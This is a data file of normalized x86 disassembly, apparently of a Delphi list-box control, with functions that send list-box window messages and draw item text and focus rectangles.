retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40348c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_40348c
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40348c
sub_440efc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b008
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_4482b0
mov edx 0x61
mov eax ebx
call sub_4482d4
mov dl 0x1
mov eax ebx
call sub_44f510
xor edx edx
mov eax ebx
call sub_448cb8
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_4476d0
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_440fe8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
mov eax [ esi + 0x228 ]
call sub_403290
mov eax [ esi + 0x218 ]
call sub_403290
mov eax [ esi + 0x240 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_441030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_4410a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov esi eax
mov eax esi
call sub_408638
push eax
mov edx esi
lea eax [ ebp - 0x8 ]
pop ecx
call sub_4040f8
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x218 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4410aa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_4410b4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4410d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_441110
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441130
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
sub_441164
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_4415a4
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_4411ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4412c3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4412ca
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40402c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4044c8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404200
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4044c8
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404200
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_441554
test al al
je r-xdata
jmp r-xdata
sub_4412d4
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_441554
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_441340
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_4484f8
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402aa8
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov esi 0x1
sub_441394
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_44c87c
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
call sub_441340
sub_4413d8
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_441454
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
jmp r-xdata
sub_4414a0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_44c87c
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_4414c8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_449ca8
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_441554
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
sub_4415a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_44f2dc
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_44f2dc
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_44f2dc
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
jmp r-xdata
sub_441678
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_44c87c
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_441654
sub_4416d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441778
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44177f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408674
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ esi + 0xc ] eax
jmp r-xdata
sub_441784
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44181a
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441821
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ esi + 0xc ] eax
jmp r-xdata
sub_44183c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4416b4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
sub_441868
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_441678
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_441678
jmp r-xdata
sub_4418ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_4416b4
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_449ca8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_441938
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test ebx ebx
je r-xdata
push edi
mov ecx ebx
mov edx 0x198
mov eax esi
call sub_449ca8
jmp r-xdata
cmp eax ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
cmp eax ebx
jne r-xdata
mov eax edi
xor ecx ecx
mov edx 0x10
call sub_402ca4
push edi
mov ecx ebx
dec ecx
mov edx 0x198
mov eax esi
call sub_449ca8
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
push 0x0
push edi
call OffsetRect
jmp r-xdata
sub_44199c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44c168
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44c094
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_40348c
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_441ab4
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_44c294
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_441340
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_44247c
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_44183c
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d070
sub_441b84
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_44c678
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_4416b4
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_441c00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ccf0
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_449264
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44cc5c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_441c66
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_45f724
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_44a178
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44919c
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b4c
mov edx esp
mov cl 0x1
mov eax esi
call sub_4418ac
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_441554
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44919c
jmp r-xdata
sub_441d04
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_448700
mov eax esi
mov si 0xffeb
call sub_40348c
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40348c
jmp r-xdata
pop esi
retn
sub_441d38
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_44f2dc
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_44f2dc
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_44f2dc
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_44f2dc
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_44f2dc
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_4416b4
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_416cd4
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_441e98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44d46c
push ebp
call sub_441d38
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_441edc
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_448638
lea eax [ esp + 0x18 ]
call sub_406b60
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_441f3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442048
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_4243a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44204f
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx 0x824
mov eax ebx
call sub_44add4
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_442560
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_404008
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x228 ]
call sub_4248b4
push eax
call DrawTextA
sub_442078
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_424934
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_4247d4
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_4247f0
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_4243a0
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423fb4
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4237e8
xor edx edx
mov eax [ esi + 0x228 ]
call sub_424934
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_442134
push ebx
push esi
push edi
mov esi eax
